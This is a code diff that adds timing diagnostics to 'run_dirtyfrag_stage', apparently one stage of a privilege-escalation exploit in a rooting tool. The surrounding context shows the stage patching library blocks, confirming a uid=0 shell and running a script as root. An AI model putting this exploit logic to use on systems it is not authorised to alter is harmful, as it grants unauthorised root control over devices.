@@ -248,6 +248,15 @@ namespace ghostlock::session {
     } // namespace
 
     int run_dirtyfrag_stage(const char *control_path, const char *mode) {
+        /* The stage is a second native invocation; the exploit session's
+         * `[T+ms]` clock does not exist here. A local clock from the function
+         * start makes the stage measurable without the app's wall. */
+        const auto stage_t0 = std::chrono::steady_clock::now();
+        const auto stage_ms = [&stage_t0]() {
+            return std::chrono::duration_cast<std::chrono::milliseconds>(
+                       std::chrono::steady_clock::now() - stage_t0)
+                .count();
+        };
         dirty_plan plan{};
         if (!load_plan(control_path, &plan)) return 1;
         const bool no_shell = (mode != nullptr && std::strcmp(mode, "noshell") == 0);
@@ -255,9 +264,10 @@ namespace ghostlock::session {
         /* Diagnostic A/B arm: the old behaviour (restore after the root
          * script) instead of the product's early restore. */
         const bool late_restore = (mode != nullptr && std::strcmp(mode, "laterestore") == 0);
-        std::printf("dirtyfrag: plan lib=%s patch=%zu restore=%zu socket=@%s mode=%s\n",
-                    plan.lib.c_str(), plan.patch.size(), plan.restore.size(),
-                    plan.socket_name.c_str(), mode != nullptr ? mode : "full");
+        std::printf("dirtyfrag: T+%lldms plan lib=%s patch=%zu restore=%zu socket=@%s mode=%s\n",
+                    static_cast<long long>(stage_ms()), plan.lib.c_str(), plan.patch.size(),
+                    plan.restore.size(), plan.socket_name.c_str(),
+                    mode != nullptr ? mode : "full");
 
         const int file_fd = open(plan.lib.c_str(), O_RDONLY);
         if (file_fd < 0) {
@@ -282,7 +292,7 @@ namespace ghostlock::session {
                 break;
             }
         }
-        if (ok) std::printf("dirtyfrag: patched %zu blocks\n", plan.patch.size());
+        if (ok) std::printf("dirtyfrag: T+%lldms patched %zu blocks\n", static_cast<long long>(stage_ms()), plan.patch.size());
 
         const auto dump_block = [&](const char *label, const dirty_entry &entry) {
             uint8_t block[16];
@@ -318,7 +328,7 @@ namespace ghostlock::session {
                     restore_ok = false;
                 }
             }
-            std::printf("dirtyfrag: restored %zu blocks ok=%d\n", plan.restore.size(), restore_ok ? 1 : 0);
+            std::printf("dirtyfrag: T+%lldms restored %zu blocks ok=%d\n", static_cast<long long>(stage_ms()), plan.restore.size(), restore_ok ? 1 : 0);
             if (!plan.restore.empty()) {
                 dump_block("restore-first", plan.restore.front());
                 dump_block("restore-last", plan.restore.back());
@@ -331,7 +341,7 @@ namespace ghostlock::session {
             ok = restore_blocks() && ok;
             close(sender);
             close(file_fd);
-            std::printf("dirtyfrag: RESULT=%s (noshell)\n", ok ? "OK" : "FAIL");
+            std::printf("dirtyfrag: T+%lldms RESULT=%s (noshell)\n", static_cast<long long>(stage_ms()), ok ? "OK" : "FAIL");
             return ok ? 0 : 1;
         }
 
@@ -350,7 +360,7 @@ namespace ghostlock::session {
             const char *id_command = "id\n";
             if (write(shell, id_command, std::strlen(id_command)) < 0) ok = false;
             const std::string id_reply = read_until(shell, 2000, "\n");
-            std::printf("dirtyfrag: shell=%s\n", id_reply.c_str());
+            std::printf("dirtyfrag: T+%lldms shell=%s\n", static_cast<long long>(stage_ms()), id_reply.c_str());
             if (id_reply.find("uid=0") == std::string::npos) {
                 std::fprintf(stderr, "dirtyfrag: shell is not uid=0\n");
                 ok = false;
@@ -366,7 +376,7 @@ namespace ghostlock::session {
             const std::string command = "sh '" + script + "'; echo DFRC=$?\n";
             if (write(shell, command.data(), command.size()) < 0) ok = false;
             const std::string output = read_until(shell, 30000, "DFRC=");
-            std::printf("dirtyfrag: script-output=%s\n", output.c_str());
+            std::printf("dirtyfrag: T+%lldms script-output=%s\n", static_cast<long long>(stage_ms()), output.c_str());
             if (output.find("DFRC=") == std::string::npos) {
                 std::fprintf(stderr, "dirtyfrag: root script did not finish\n");
                 ok = false;
@@ -379,7 +389,7 @@ namespace ghostlock::session {
         if (ok && !no_script) print_log_tail(config::runtime_config_snapshot().ksu_log_path);
         close(sender);
         close(file_fd);
-        std::printf("dirtyfrag: RESULT=%s%s\n", ok ? "OK" : "FAIL", no_script ? " (noscript)" : "");
+        std::printf("dirtyfrag: T+%lldms RESULT=%s%s\n", static_cast<long long>(stage_ms()), ok ? "OK" : "FAIL", no_script ? " (noscript)" : "");
         return ok ? 0 : 1;
     }
 } // namespace ghostlock::session
